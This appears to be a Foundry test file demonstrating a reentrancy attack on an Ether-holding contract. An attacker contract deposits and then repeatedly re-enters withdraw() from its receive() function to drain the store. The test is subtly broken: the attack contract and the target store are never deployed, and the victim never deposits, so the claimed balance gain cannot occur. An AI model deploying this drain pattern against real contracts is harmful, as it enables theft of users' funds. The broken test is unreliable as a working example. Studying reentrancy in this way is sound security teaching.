// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IEtherStore {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackContract {
    IEtherStore public etherStore;
    constructor(address _etherStore) { etherStore = IEtherStore(_etherStore); }

    function attack() external payable {
        etherStore.deposit{value: msg.value}();
        etherStore.withdraw();
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
}

contract EtherStoreTest is Test {
    AttackContract attackContract;
    address victim = address(0xBEEF);

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.deal(address(this), 1 ether);
    }

    function testReentrancyAttack() public {
        uint256 before = address(attackContract).balance;
        console.log("Attacker balance before:", before);
        attackContract.attack{value: 1 ether}();
        uint256 after_ = address(attackContract).balance;
        console.log("Attacker balance after:", after_);
        assertGt(after_, before);
    }
}
